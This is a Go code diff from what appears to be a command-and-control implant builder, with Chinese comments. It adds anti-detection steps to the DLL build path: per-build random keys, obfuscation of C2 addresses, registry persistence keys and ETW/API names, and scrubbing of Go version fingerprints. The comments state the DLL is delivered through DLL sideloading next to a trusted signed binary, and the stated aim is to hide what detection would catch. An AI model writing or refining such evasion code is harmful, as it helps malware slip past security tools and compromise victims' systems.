@@ -646,14 +646,23 @@ func (b *Builder) compileLibrary(opts BuildOptions) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
+	// DLL 路径此前**漏了 exe 路径的两道静态降特征工序**（v1.4.0 S3 补齐）：
+	//   ① injectBuildConstants：每构建随机的配置块魔数/密钥 + xd 密钥基准；
+	//   ② obfuscateImplantSources：模板字符串混淆（C2 地址、注册表键、ETW/API 名…）。
+	// 实测同一份模板：DLL 未做混淆时明文高信号 API 名 11 处、`http://` 2 处、ETW 4 处、
+	// 持久化注册表键 3 处，而 exe 路径（做了混淆）只剩标准库自带的那 1 处 —— 白加黑链
+	// 交付的恰恰是 DLL，等于把最该藏的东西明文交出去。顺序与 compile() 一致：
+	// 先注入（影响后续混淆的明文），再混淆，最后编译。
+	b.injectBuildConstants(tmpDir, &opts)
+	if err := b.obfuscateImplantSources(tmpDir, opts.XfBase); err != nil {
+		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
+	}
 	bin, err := b.compileSharedLibrary(tmpDir, targetOS, arch, opts, exportName, opts.DLLAutoStart)
 	if err != nil {
 		return nil, err
 	}
-	// DLL 路径的指纹擦除（v1.4.0 S3 补齐）：锚定版擦除（魔数 / Go build ID / 窗口内版本串）
-	// 已经在 compileSharedLibrary 里做过（见 dll.go 的同名日志），这里**只补全文件版本串**——
-	// 实测 c-shared 产物里 `go1.20.14`（`runtime.buildVersion`）落在锚定窗口之外，
-	// 锚定版扫不到，正是这一遍收掉的（修复前 windows/386 DLL 残留 1 次，修复后 0 次）。
+	// 指纹擦除的"版本串"这一遍（锚定版由 dll.go 的 compileSharedLibrary 负责）：实测
+	// c-shared 产物里 `go1.20.14`（runtime.buildVersion）落在锚定窗口之外，必须全文件扫一遍。
 	// 等长置零不影响 PE 节表/重定位，也不影响其后的签名（签名在 Build 里，永远是最后一步）。
 	if scrubbed, removed := ScrubGoVersionStrings(bin); len(removed) > 0 {
 		bin = scrubbed
